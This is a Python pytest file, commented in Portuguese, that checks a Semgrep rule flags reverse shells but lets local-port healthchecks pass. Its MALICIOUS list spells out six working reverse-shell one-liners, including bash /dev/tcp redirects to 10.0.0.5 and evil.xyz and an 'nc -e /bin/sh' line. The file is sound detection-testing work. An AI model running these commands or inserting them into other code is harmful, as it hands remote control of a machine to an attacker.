"""Regra auditor.sh.shell-reverso: pega shell reverso, mas não o teste de porta local (healthcheck)."""

from __future__ import annotations

import json
import shutil
import subprocess
from pathlib import Path

import pytest

RULE = Path(__file__).parents[1] / "security_auditor/app/rules/semgrep/addon/shell_dockerfile.yaml"
VENV_SEMGREP = Path(__file__).parents[1] / ".venv/bin/semgrep"

LEGIT = [
    "HEALTHCHECK CMD bash -c '</dev/tcp/127.0.0.1/1883' || exit 1",
    "HEALTHCHECK CMD bash -c 'echo > /dev/tcp/localhost/8080'",
    "timeout 1 bash -c '</dev/tcp/0.0.0.0/5432'",
    "exec 3<>/dev/tcp/127.0.0.1/6379",
]
MALICIOUS = [
    "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
    "bash -c 'sh -i >& /dev/tcp/evil.xyz/9001 0>&1'",
    "exec 5<>/dev/tcp/203.0.113.7/80; cat <&5 | sh",
    "sh -i < /dev/tcp/127.0.0.1/4444 1>&0 2>&0",           # shell ligado mesmo em destino local
    "0<&196;exec 196<>/dev/tcp/127.0.0.1/4242; sh <&196 >&196 2>&196 0>&2",
    "nc -e /bin/sh 10.0.0.5 4444",
]


def _semgrep() -> str:
    exe = shutil.which("semgrep") or (str(VENV_SEMGREP) if VENV_SEMGREP.exists() else None)
    if exe is None:
        pytest.skip("semgrep não instalado")
    return exe


def _matches(tmp_path, lines: list[str]) -> list[bool]:
    files = []
    for i, line in enumerate(lines):
        f = tmp_path / f"caso{i}.sh"
        f.write_text(line + "\n")
        files.append(f)
    res = subprocess.run(
        [_semgrep(), "scan", "--config", str(RULE), "--json", "--quiet", "--metrics=off", "--disable-version-check",
         "--oss-only", "--no-git-ignore", *map(str, files)],
        capture_output=True, text=True, timeout=180, check=False, env={"HOME": str(tmp_path), "PATH": "/usr/bin:/bin"},
    )
    hits = {Path(r["path"]).name for r in json.loads(res.stdout)["results"]
            if r["check_id"].endswith("auditor.sh.shell-reverso")}
    return [f.name in hits for f in files]


def test_local_port_checks_are_not_flagged(tmp_path):
    assert _matches(tmp_path, LEGIT) == [False] * len(LEGIT)


def test_reverse_shells_are_still_flagged(tmp_path):
    assert _matches(tmp_path, MALICIOUS) == [True] * len(MALICIOUS)
